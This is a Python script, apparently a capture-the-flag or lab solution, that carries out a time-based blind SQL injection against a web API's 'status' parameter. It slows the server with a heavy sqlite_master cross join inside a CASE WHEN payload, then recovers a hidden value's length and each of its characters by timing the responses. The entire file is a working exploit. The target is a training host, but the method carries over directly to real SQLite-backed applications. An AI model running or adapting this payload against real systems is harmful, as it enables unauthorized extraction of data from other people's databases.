import requests
import time
import string

BASE_URL = "http://web0x01.hbtn/api/a3/sql_injection/all_orders"
CHARSET = string.ascii_letters + string.digits + "-_{}!"
N_JOINS = 7
THRESHOLD = 4.5

def build_condition_payload(condition_sql):
    joins = ", ".join([f"sqlite_master t{i}" for i in range(N_JOINS)])
    payload = (
        f"X' OR (CASE WHEN ({condition_sql}) THEN "
        f"(SELECT COUNT(*) FROM {joins}) ELSE 0 END)>0--"
    )
    return payload

def is_true(condition_sql):
    payload = build_condition_payload(condition_sql)
    params = {"status": payload}
    start = time.time()
    try:
        requests.get(BASE_URL, params=params, timeout=15)
    except requests.exceptions.Timeout:
        return True
    elapsed = time.time() - start
    print(f"    [debug] elapsed={elapsed:.2f}s")
    return elapsed >= THRESHOLD

def get_length(table, column):
    for length in range(1, 100):
        cond = f"(SELECT LENGTH({column}) FROM {table} LIMIT 1)={length}"
        if is_true(cond):
            return length
    return None

def extract_value(table, column, length):
    result = ""
    for pos in range(1, length + 1):
        found = False
        for char in CHARSET:
            cond = f"(SELECT SUBSTR({column},{pos},1) FROM {table} LIMIT 1)='{char}'"
            if is_true(cond):
                result += char
                print(f"[+] Tapildi: {result}")
                found = True
                break
        if not found:
            result += "?"
            print(f"[!] Simvol tapilmadi, pozisiya {pos}")
    return result

if __name__ == "__main__":
    print("[*] Uzunluq axtarilir...")
    length = get_length("not_me", "value")
    print(f"[*] Uzunluq: {length}")

    if length:
        print("[*] Deyer cixarilir...")
        flag = extract_value("not_me", "value", length)
        print(f"[+] FLAG: {flag}")
